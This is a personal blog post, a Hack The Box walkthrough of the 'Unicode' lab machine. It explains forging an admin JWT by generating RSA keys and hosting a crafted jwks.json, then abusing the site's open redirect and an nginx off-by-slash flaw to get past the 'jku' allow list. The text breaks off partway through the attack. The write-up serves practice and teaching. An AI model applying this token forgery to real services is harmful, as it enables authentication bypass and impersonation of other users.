@@ -1,0 +1,645 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 6.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.3.0/css/all.min.css" integrity="sha256-/4UQcSmErDzPCMAiuOiWPVVsNN2s3ZY/NsmXNcj0IFc=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/themes/blue/pace-theme-minimal.css">
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/pace.min.js" integrity="sha256-gqd7YTjg/BtfqWSwsJOvndl0Bxc8gFImLEkXQT8+qj0=" crossorigin="anonymous"></script>
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"fdlucifer.github.io","root":"/","images":"/images","scheme":"Muse","darkmode":true,"version":"8.15.0","exturl":true,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":true,"style":"mac"},"bookmark":{"enable":true,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":true,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="introduceOS:	 LinuxDifficulty:	MediumPoints:	30Release:	27 Nov 2021IP:	10.10.11.126">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Hack-The-Box-walkthrough[unicode]">
+<meta property="og:url" content="https://fdlucifer.github.io/2021/12/01/unicode/index.html">
+<meta property="og:site_name" content="lUc1f3r11&#39;s blog">
+<meta property="og:description" content="introduceOS:	 LinuxDifficulty:	MediumPoints:	30Release:	27 Nov 2021IP:	10.10.11.126">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2105.jpg">
+<meta property="og:image" content="http://www.hackthebox.eu/badge/image/235857">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2106.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2107.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2108.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2109.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2110.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2111.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2112.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2113.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2114.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2115.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2116.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2117.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2118.jpg">
+<meta property="article:published_time" content="2021-12-01T13:18:09.000Z">
+<meta property="article:modified_time" content="2022-05-08T03:29:46.908Z">
+<meta property="article:author" content="lUc1f3r11">
+<meta property="article:tag" content="HackTheBox靶机练习">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2105.jpg">
+
+
+<link rel="canonical" href="https://fdlucifer.github.io/2021/12/01/unicode/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"https://fdlucifer.github.io/2021/12/01/unicode/","path":"2021/12/01/unicode/","title":"Hack-The-Box-walkthrough[unicode]"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>Hack-The-Box-walkthrough[unicode] | lUc1f3r11's blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">lUc1f3r11's blog</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">by lUc1f3r11</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="Search" role="button">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags<span class="badge">42</span></a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories<span class="badge">32</span></a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives<span class="badge">203</span></a></li><li class="menu-item menu-item-schedule"><a href="/schedule/" rel="section"><i class="fa fa-calendar fa-fw"></i>Schedule</a></li><li class="menu-item menu-item-sitemap"><a href="/sitemap.xml" rel="section"><i class="fa fa-sitemap fa-fw"></i>Sitemap</a></li><li class="menu-item menu-item-commonweal"><a href="/404/" rel="section"><i class="fa fa-heartbeat fa-fw"></i>Commonweal 404</a></li>
+  </ul>
+</nav>
+
+
+
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#introduce"><span class="nav-number">1.</span> <span class="nav-text">introduce</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Enumeration"><span class="nav-number">2.</span> <span class="nav-text">Enumeration</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#NMAP"><span class="nav-number">2.1.</span> <span class="nav-text">NMAP</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#privesclation"><span class="nav-number">3.</span> <span class="nav-text">privesclation</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Summary-of-knowledge"><span class="nav-number">4.</span> <span class="nav-text">Summary of knowledge</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Contact-me"><span class="nav-number">5.</span> <span class="nav-text">Contact me</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="lUc1f3r11"
+      src="/images/lucifer11.jpg">
+  <p class="site-author-name" itemprop="name">lUc1f3r11</p>
+  <div class="site-description" itemprop="description">All things about infosec & ctf</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">203</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">32</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">42</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlcg==" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;FDlucifer"><i class="fab fa-github fa-fw"></i>GitHub</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="bWFpbHRvOjExODUxNTE4NjdAcXEuY29t" title="E-Mail → mailto:1185151867@qq.com"><i class="fa fa-envelope fa-fw"></i>E-Mail</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly90d2l0dGVyLmNvbS9mZGx1Y2lmZXIxMQ==" title="Twitter → https:&#x2F;&#x2F;twitter.com&#x2F;fdlucifer11"><i class="fab fa-twitter fa-fw"></i>Twitter</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL3Byb2ZpbGUucGhwP2lkPTEwMDAxOTY5NDUyODYyMA==" title="FB Page → https:&#x2F;&#x2F;www.facebook.com&#x2F;profile.php?id&#x3D;100019694528620"><i class="fab fa-facebook fa-fw"></i>FB Page</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly93d3cueW91dHViZS5jb20vY2hhbm5lbC9VQ19saVRlaDRSMUZNYnBWeGxwTWUtdnc=" title="YouTube → https:&#x2F;&#x2F;www.youtube.com&#x2F;channel&#x2F;UC_liTeh4R1FMbpVxlpMe-vw"><i class="fab fa-youtube fa-fw"></i>YouTube</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly93d3cuaW5zdGFncmFtLmNvbS95YW5nODkyOS8=" title="Instagram → https:&#x2F;&#x2F;www.instagram.com&#x2F;yang8929&#x2F;"><i class="fab fa-instagram fa-fw"></i>Instagram</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly9pbmZvc2VjLmV4Y2hhbmdlL0BsVWMxZjNyMTE=" title="infosec.exchange → https:&#x2F;&#x2F;infosec.exchange&#x2F;@lUc1f3r11"><i class="custom mastodon fa-fw"></i>infosec.exchange</span>
+      </span>
+  </div>
+  <div class="cc-license animated" itemprop="license">
+    <span class="exturl cc-opacity" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><img src="https://cdnjs.cloudflare.com/ajax/libs/creativecommons-vocabulary/2020.11.3/assets/license_badges/big/by_nc_sa.svg" alt="Creative Commons"></span>
+  </div>
+
+        </div>
+      </div>
+        <div class="back-to-top animated" role="button" aria-label="Back to top">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+    </div>
+
+    
+    <div class="sidebar-inner sidebar-blogroll">
+      <div class="links-of-blogroll animated">
+        <div class="links-of-blogroll-title"><i class="fa fa-globe fa-fw"></i>
+          Links
+        </div>
+        <ul class="links-of-blogroll-list">
+            <li class="links-of-blogroll-item">
+              <span class="exturl" data-url="aHR0cHM6Ly9hdHN1ZDAubWUv" title="https:&#x2F;&#x2F;atsud0.me&#x2F;">atsud0</span>
+            </li>
+            <li class="links-of-blogroll-item">
+              <span class="exturl" data-url="aHR0cHM6Ly9kcm9pZGthbGkuZ2l0aHViLmlvLw==" title="https:&#x2F;&#x2F;droidkali.github.io&#x2F;">记忆里的纯真</span>
+            </li>
+            <li class="links-of-blogroll-item">
+              <span class="exturl" data-url="aHR0cHM6Ly94aWFvbGltYXJzLndvcmRwcmVzcy5jb20v" title="https:&#x2F;&#x2F;xiaolimars.wordpress.com&#x2F;">小离</span>
+            </li>
+        </ul>
+      </div>
+    </div>
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://fdlucifer.github.io/2021/12/01/unicode/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/lucifer11.jpg">
+      <meta itemprop="name" content="lUc1f3r11">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="lUc1f3r11's blog">
+      <meta itemprop="description" content="All things about infosec & ctf">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="Hack-The-Box-walkthrough[unicode] | lUc1f3r11's blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Hack-The-Box-walkthrough[unicode]
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2021-12-01 21:18:09" itemprop="dateCreated datePublished" datetime="2021-12-01T21:18:09+08:00">2021-12-01</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">Edited on</span>
+      <time title="Modified: 2022-05-08 11:29:46" itemprop="dateModified" datetime="2022-05-08T11:29:46+08:00">2022-05-08</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/HackTheBox-walkthrough/" itemprop="url" rel="index"><span itemprop="name">HackTheBox walkthrough</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <h1 id="introduce"><a href="#introduce" class="headerlink" title="introduce"></a>introduce</h1><p>OS:	 Linux<br>Difficulty:	Medium<br>Points:	30<br>Release:	27 Nov 2021<br>IP:	10.10.11.126</p>
+<ul>
+<li><p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2105.jpg"></p>
+</li>
+<li><p><img src="http://www.hackthebox.eu/badge/image/235857" alt="my htb rank"></p>
+</li>
+</ul>
+<span id="more"></span>
+
+<h1 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a>Enumeration</h1><h2 id="NMAP"><a href="#NMAP" class="headerlink" title="NMAP"></a>NMAP</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/unicode]</span><br><span class="line">└─<span class="comment"># nmap -sV -v -p- --min-rate=10000 10.10.11.126</span></span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">80/tcp open  http    nginx 1.18.0 (Ubuntu)</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br></pre></td></tr></table></figure>
+
+<p>Nmap reveals only two open ports on the target. HTTP is running on Nginx. Let’s look into HTTP.</p>
+<p>Web page has login and register links. Upon hovering ‘google about us’, we’d see a redirect link.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /redirect/?url=google.com HTTP/1.1</span><br></pre></td></tr></table></figure>
+
+<p>Let’s create a new account and login.</p>
+<p>After login we’d see below dashboard.</p>
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2106.jpg"></li>
+</ul>
+<p>It has three more links, upload, buy now and logout. the first two links did not lead to anywhere. Server is using JWT as cookies.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cookie: auth=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9oYWNrbWVkaWEuaHRiL3N0YXRpYy9qd2tzLmpzb24ifQ.eyJ1c2VyIjoidGVzdEB0ZXN0LmNvbSJ9.BAzUpzOSU72w-MproYXSq_JQp1eCGkv_XkihDOVYRs4Qu3WJcBw0bguRUPJlM_Xr3Qib_2FkUpuI8YczJn4IARiYVNvDfLp0C53O74Mk8Vk-w7Y7KmPKHPp6q4tGkNzZoU6cymaqjTTJ58EWx8koy1mMRnXyg6WSFXDwY8o2BSNqIC4vbbVtScl2CV8J_IV5mgbyKn0hiqPF7iIzJnxVJwpmgYStKyGcLpkbQljNL84JuuAY9LQxuj0NU4n3vOJaBxV6vGrpJWi3gDBJv81OdXv8mgNxBtT2aaNH8GlBXOGYn-6PdQoNyoLj_cqWacm0Cneq4A3HE0YCDU6npQpP3w</span><br></pre></td></tr></table></figure>
+
+<p>Let’s decode this cookie with <span class="exturl" data-url="aHR0cHM6Ly9qd3QuaW8v">https://jwt.io<i class="fa fa-external-link-alt"></i></span></p>
+<p>We got the decoded data. The interesting part of this data is, ‘JKU’.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">The <span class="string">&quot;jku&quot;</span> (Json Web Key Set URL) Header Parameter is a URI that refers to a resource <span class="keyword">for</span> a <span class="built_in">set</span> of JSON-encoded public keys, one of <span class="built_in">which</span> corresponds to the key used to digitally sign the JWS (JSON Web Signature).</span><br></pre></td></tr></table></figure>
+
+<p>This JKU is pointing to a domain, add that domain to hosts file and read the file.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/unicode]</span><br><span class="line">└─<span class="comment"># curl http://hackmedia.htb/static/jwks.json</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;keys&quot;</span>: [</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="string">&quot;kty&quot;</span>: <span class="string">&quot;RSA&quot;</span>,</span><br><span class="line">            <span class="string">&quot;use&quot;</span>: <span class="string">&quot;sig&quot;</span>,</span><br><span class="line">            <span class="string">&quot;kid&quot;</span>: <span class="string">&quot;hackthebox&quot;</span>,</span><br><span class="line">            <span class="string">&quot;alg&quot;</span>: <span class="string">&quot;RS256&quot;</span>,</span><br><span class="line">            <span class="string">&quot;n&quot;</span>: <span class="string">&quot;AMVcGPF62MA_lnClN4Z6WNCXZHbPYr-dhkiuE2kBaEPYYclRFDa24a-AqVY5RR2NisEP25wdHqHmGhm3Tde2xFKFzizVTxxTOy0OtoH09SGuyl_uFZI0vQMLXJtHZuy_YRWhxTSzp3bTeFZBHC3bju-UxiJZNPQq3PMMC8oTKQs5o-bjnYGi3tmTgzJrTbFkQJKltWC8XIhc5MAWUGcoI4q9DUnPj_qzsDjMBGoW1N5QtnU91jurva9SJcN0jb7aYo2vlP1JTurNBtwBMBU99CyXZ5iRJLExxgUNsDBF_DswJoOxs7CAVC5FjIqhb1tRTy3afMWsmGqw8HiUA2WFYcs&quot;</span>,</span><br><span class="line">            <span class="string">&quot;e&quot;</span>: <span class="string">&quot;AQAB&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>The below links will help us to understand JWT, JWK and JKU.</p>
+<ul>
+<li><span class="exturl" data-url="aHR0cHM6Ly9oYWNrZXJub29uLmNvbS9qc29uLXdlYi10b2tlbnMtand0LWRlbXlzdGlmaWVkLWY3ZTIwMjI0OTY0MA==">JSON Web Tokens (JWT) Demystified<i class="fa fa-external-link-alt"></i></span></li>
+<li><span class="exturl" data-url="aHR0cHM6Ly9vcGVuaWQubmV0L3NwZWNzL2RyYWZ0LWpvbmVzLWpzb24td2ViLWtleS0wMy5odG1s">JSON Web Key (JWK) draft-jones-json-web-key-03<i class="fa fa-external-link-alt"></i></span></li>
+</ul>
+<p>Based on the above blogs, below is the normal working process.</p>
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2107.jpg"></li>
+</ul>
+<p>We need to redirect the JKU header request to our server.</p>
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2108.jpg"></li>
+</ul>
+<p>The above representation is what we need to achieve. To do that, first we need to generate RSA key pair. For that we can use any one of the below tools.</p>
+<ul>
+<li><span class="exturl" data-url="aHR0cHM6Ly9ta2p3ay5vcmcv">mkjwk simple JSON Web Key generator<i class="fa fa-external-link-alt"></i></span></li>
+<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3RpY2FycGkvand0X3Rvb2w=">jwt_tool<i class="fa fa-external-link-alt"></i></span></li>
+</ul>
+<p>I will use online generator for this demo. Select below options and generate the random RSA key pair.</p>
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2109.jpg"></li>
+</ul>
+<p>After generating, you will see private and public keys just like below.</p>
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2110.jpg"></li>
+</ul>
+<p>Now we have generated the keys, it’s time to use these keys to craft the JSON Web Tokens. To do that we have to use default JWT and edit it accordingly.</p>
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2111.jpg"></li>
+</ul>
+<p>The above is default JWT, taken from cookies after login. Now we need to edit three things.</p>
+<ul>
+<li>JKU value</li>
+<li>User Value: change it to admin</li>
+<li>Public and Private Keys: add respective keys previously generated from online site.</li>
+</ul>
+<p>Below is the final draft of JWT.</p>
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2112.jpg"></li>
+</ul>
+<p>As you can see the difference between default ‘JKU’ value and crafted one, it is different. The objective is to redirect it to our server, if we just add our IP as JKU address it will not work, as ‘hackmedia’ is only one in the allow list and it gives us an error ‘JKU validation failed’. The validation check is up to ‘<span class="exturl" data-url="aHR0cDovL2hhY2ttZWRpYS5odGIvc3RhdGljLw==">http://hackmedia.htb/static/<i class="fa fa-external-link-alt"></i></span>‘. We have to change &#x2F;add after that. So, as we already know it is an NginX server, we can take advantage of ‘off-by-slash’ bug and take advantage of going one step back in the directory and use ‘redirect’ endpoint.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://hackmedia.com/redirect/?url=google.com</span><br></pre></td></tr></table></figure>
+
+<p>We already know it exists, so we just need to access it and redirect it to our Kali Machine. On Kali machine we set up a crafted ‘jwks.json’ file. Let’s craft the ‘jwks.json’ file.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/unicode]</span><br><span class="line">└─<span class="comment"># curl http://hackmedia.htb/static/jwks.json</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;keys&quot;</span>: [</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="string">&quot;kty&quot;</span>: <span class="string">&quot;RSA&quot;</span>,</span><br><span class="line">            <span class="string">&quot;use&quot;</span>: <span class="string">&quot;sig&quot;</span>,</span><br><span class="line">            <span class="string">&quot;kid&quot;</span>: <span class="string">&quot;hackthebox&quot;</span>,</span><br><span class="line">            <span class="string">&quot;alg&quot;</span>: <span class="string">&quot;RS256&quot;</span>,</span><br><span class="line">            <span class="string">&quot;n&quot;</span>: <span class="string">&quot;AMVcGPF62MA_lnClN4Z6WNCXZHbPYr-dhkiuE2kBaEPYYclRFDa24a-AqVY5RR2NisEP25wdHqHmGhm3Tde2xFKFzizVTxxTOy0OtoH09SGuyl_uFZI0vQMLXJtHZuy_YRWhxTSzp3bTeFZBHC3bju-UxiJZNPQq3PMMC8oTKQs5o-bjnYGi3tmTgzJrTbFkQJKltWC8XIhc5MAWUGcoI4q9DUnPj_qzsDjMBGoW1N5QtnU91jurva9SJcN0jb7aYo2vlP1JTurNBtwBMBU99CyXZ5iRJLExxgUNsDBF_DswJoOxs7CAVC5FjIqhb1tRTy3afMWsmGqw8HiUA2WFYcs&quot;</span>,</span><br><span class="line">            <span class="string">&quot;e&quot;</span>: <span class="string">&quot;AQAB&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>‘n’ : modulus value for the RSA public key</p>
+</li>
+<li><p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2113.jpg"></p>
+</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/unicode]</span><br><span class="line">└─<span class="comment"># cat jwks.json </span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;keys&quot;</span>: [</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="string">&quot;kty&quot;</span>: <span class="string">&quot;RSA&quot;</span>,</span><br><span class="line">            <span class="string">&quot;use&quot;</span>: <span class="string">&quot;sig&quot;</span>,</span><br><span class="line">            <span class="string">&quot;kid&quot;</span>: <span class="string">&quot;hackthebox&quot;</span>,</span><br><span class="line">            <span class="string">&quot;alg&quot;</span>: <span class="string">&quot;RS256&quot;</span>,</span><br><span class="line">            <span class="string">&quot;n&quot;</span>: <span class="string">&quot;kYtRuyinTL4D-22Q3WgbSWff3ClIie10qeeGjunpW-4DgO5WWlHMVI3qxyXnGPvVIfQuARkzNBGQ2O4rytPnF0OoSD6cCNxmGKqVoIratzskq28OFnfqO_QhEkVhGfd_drGqa0wMNEU312XVfGzfP7V_GWn9aQcLnaWMQUlDwYOKG_UEcOQgur3sKpCdZjMThYJ_33oYmhdtHd3sA-SaNiYtwWW2AJHcCJkaaxSN-lB1lx--pmTMqfL1fURJ_0n3vHO0jAs2Kwk2rm9rgQNABuQxgotu0IRNaK3R61d7Cz41evkQm2s9ya4XR0y1iqBRkElbFCpNUWt9hP3gb5Ty9Q&quot;</span>,</span><br><span class="line">            <span class="string">&quot;e&quot;</span>: <span class="string">&quot;AQAB&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>The above is edited and replaced it with RSA n value which we have generated. Once you edit that, start a HTTP sever where that file is present. Everything is set, now the only thing is to copy the encoded JWT from the online website.</p>
